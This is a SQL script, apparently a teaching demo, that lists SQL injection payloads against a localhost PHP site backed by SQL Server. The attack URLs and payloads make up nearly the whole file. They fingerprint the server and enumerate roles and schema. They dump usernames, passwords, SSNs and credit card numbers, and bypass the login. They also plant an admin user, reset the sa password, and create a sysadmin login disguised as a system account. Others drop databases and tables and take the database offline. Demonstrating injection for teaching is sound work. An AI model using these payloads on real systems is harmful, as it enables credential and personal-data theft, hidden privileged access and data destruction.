-- ********************************************************************************
--						==== SQL INJECTION ATTACK DEMO'S ====
-- ********************************************************************************

-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
-- ===== 1. GATHER INFORMATION =====
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------


-- Conditional Responses
/*
-----------------------------------------------------------------------------------
-- == FIND OUT IF IT IS SQL SERVER AND WHAT VERSION == 
-- list of versions: http://sqlserverbuilds.blogspot.com/
-----------------------------------------------------------------------------------
-- find a page that will work with conditional responses
http://localhost/htm/product-details.php?ID=589
http://localhost/htm/product-list.php?StatusFilter=Current

-- find out if it's MySQL
http://localhost/htm/product-details.php?ID=589 and substring(@@version_comment,1,5) = 'MySQL'

-- find out if it's sql server
http://localhost/htm/product-details.php?ID=589 and substring(@@VERSION,1,20) = 'Microsoft SQL Server'
-- can also test it on the product list page
http://localhost/htm/product-list.php?StatusFilter=Current' and substring(@@VERSION,1,5) = 'MySQL' --
http://localhost/htm/product-list.php?StatusFilter=Current' and substring(@@VERSION,1,20) = 'Microsoft SQL Server' --

-- check what version
-- 2005
http://localhost/htm/product-details.php?ID=589 and substring(cast(SERVERPROPERTY('productversion') as varchar(20)),1,1)=9
-- 2008
http://localhost/htm/product-details.php?ID=589 and substring(cast(SERVERPROPERTY('productversion') as varchar(20)),1,4)=10.0
-- 2008 R2
http://localhost/htm/product-details.php?ID=589 and substring(cast(SERVERPROPERTY('productversion') as varchar(20)),1,4)=10.5
-- 2012
http://localhost/htm/product-details.php?ID=589 and substring(cast(SERVERPROPERTY('productversion') as varchar(20)),1,2)=11
-- 2014
http://localhost/htm/product-details.php?ID=589 and substring(cast(SERVERPROPERTY('productversion') as varchar(20)),1,2)=12

-- check SP
http://localhost/htm/product-details.php?ID=589 and SERVERPROPERTY('productlevel')='SP1'
http://localhost/htm/product-details.php?ID=589 and SERVERPROPERTY('productlevel')='SP2'


-----------------------------------------------------------------------------------
-- == SYSTEM INFORMATION == 
-----------------------------------------------------------------------------------
-- Get a working union statement
http://localhost/htm/product-list.php?StatusFilter=' or 1=1 union select distinct x=null,x=null,x=null,x=null,x=null,x=null,x=null,x=null --
http://localhost/htm/product-list.php?StatusFilter=' or 1=1 union select distinct x=null,x=null,x=null,x=null,x=null,x=null,x=null,x=null,x=null,x=null --

-- How much RAM is on the server?
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x='RAM',x=physical_memory_kb,x=null,x=null,x=null,x=null,x=null,x=null,x=null from sys.dm_os_sys_info --

-- # of CPU's
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x='CPU COUNT',x=cpu_count,x=null,x=null,x=null,x=null,x=null,x=null,x=null from sys.dm_os_sys_info --

-- SQL Server start time
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x='SQL Server Start Time',x=cast(sqlserver_start_time as varchar(20)),x=null,x=null,x=null,x=null,x=null,x=null,x=null from sys.dm_os_sys_info --

-- Find server host name
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x='Host Name',x=cast(SERVERPROPERTY('MachineName') as varchar(255)),x=null,x=null,x=null,x=null,x=null,x=null,x=null --


-----------------------------------------------------------------------------------
-- == CURRENT USER INFORMATION == 
-----------------------------------------------------------------------------------

-- Find out who I am
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x='Logged In As',x=SUSER_NAME(),x=null,x=null,x=null,x=null,x=null,x=null,x=null --

-- Am I in the db_datareader role?
http://localhost/htm/product-details.php?ID=574 and (SELECT USER_NAME(memberuid) FROM sys.sysmembers WHERE USER_NAME(groupuid)='db_datareader' and USER_NAME(memberuid)='AdventureWorksUser')='AdventureWorksUser'

-- Am I in db_owner?
http://localhost/htm/product-details.php?ID=574 and (SELECT USER_NAME(memberuid) FROM sys.sysmembers WHERE USER_NAME(groupuid) IN ('db_owner', 'db_accessadmin') and USER_NAME(memberuid)='AdventureWorksUser')='AdventureWorksUser'

-- Am I a sysadmin?
http://localhost/htm/product-details.php?ID=574 and (select p.name FROM sys.server_principals p JOIN sys.syslogins s ON p.sid=s.sid WHERE p.type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN', 'WINDOWS_GROUP') and s.sysadmin=1 and p.is_disabled=0 and p.name='AdventureWorksUser') = 'AdventureWorksUser'


-----------------------------------------------------------------------------------
-- == GET A LIST OF USERNAMES AND PASSWORDS == 
-----------------------------------------------------------------------------------
-- Get a list of databases
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select x=null,x=null,x=name,x=null,x=null,x=null,x=null,x=null,x=null,x=null from sys.databases --


-- Find the current database name
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x=null,x=DB_NAME(),x=null,x=null,x=null,x=null,x=null,x=null,x=null --

-- Get a list of tables in the current database
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x=null,x=TABLE_NAME,x=null,x=null,x=null,x=null,x=null,x=null,x=null from AdventureWorksDemo.information_schema.columns --

-- Get a list of fields in a given table (ie. user table)
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select distinct x=null,x=null,x=COLUMN_NAME,x=null,x=null,x=null,x=null,x=null,x=null,x=null from AdventureWorksDemo.information_schema.columns where TABLE_NAME='DimUser' --

-- Get a list of usernames, passwords, and SSN (or credit card #'s)
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select x=null,x=null,x=UserName,x=Password,x=null,x=null,x=SSN,x=null,x=null,x=null from DimUser --
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select x=null,x=null,x=UserName,x=Password,x=null,x=null,x=CreditCardNum,x=null,x=null,x=null from DimUser --



-----------------------------------------------------------------------------------
-- == START THE ATTACKS == 
-----------------------------------------------------------------------------------

-- Hack the Login
' or 1=1 --

-- == INSERT AN ADMIN LEVEL USER INTO THE DATABASE (Main Page) ==
' insert into DimUser (UserName, Password, UserType) values ('hacker21','mypassword','Admin') --
-- check that it was added
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select x=null,x=null,x=UserName,x=Password,x=null,x=null,x=SSN,x=null,x=null,x=null from DimUser --


-- Enable sa and change the password
' ALTER LOGIN [sa] ENABLE --
' ALTER LOGIN [sa] WITH PASSWORD=N'SQlS@turd@y!' --


-- == CREATE A SYSADMIN ON SQL SERVER (Main Page) ==
-- Step 1: Create the Account
' CREATE LOGIN [##MS_PolicyTaskProcessingLogin##] WITH PASSWORD=N'SQlS@turd@y!' --

-- Step 2: Give it sysadmin permissions
' ALTER SERVER ROLE [sysadmin] ADD MEMBER [##MS_PolicyTaskProcessingLogin##] --


-- == DELETE ALL DATABASE USER RECORDS EXCEPT US (Main Page) ==
' delete from DimUser where UserName <> 'Hacker21' --
http://localhost/htm/product-list.php?StatusFilter=' or 1=0 union select x=null,x=null,x=UserName,x=Password,x=null,x=null,x=SSN,x=null,x=null,x=null from DimUser --


-- == DROP SOME DATABASES (Main Page) ==
' drop database DataWarehouse --
' drop database DataMart --


-- == DROP A TABLE (Main Page) ==
' drop table FactEmployeePayroll --


-- Take the database offline (works as DB Owner)
' ALTER DATABASE AdventureWorksDemo SET SINGLE_USER WITH ROLLBACK IMMEDIATE --
' ALTER DATABASE AdventureWorksDemo SET READ_ONLY --
' ALTER DATABASE AdventureWorksDemo SET EMERGENCY --
' ALTER DATABASE AdventureWorksDemo SET OFFLINE WITH NO_WAIT --

-- Bring back online
ALTER DATABASE AdventureWorksDemo SET READ_WRITE
GO
ALTER DATABASE AdventureWorksDemo SET MULTI_USER
GO
ALTER DATABASE AdventureWorksDemo SET ONLINE
GO
*/


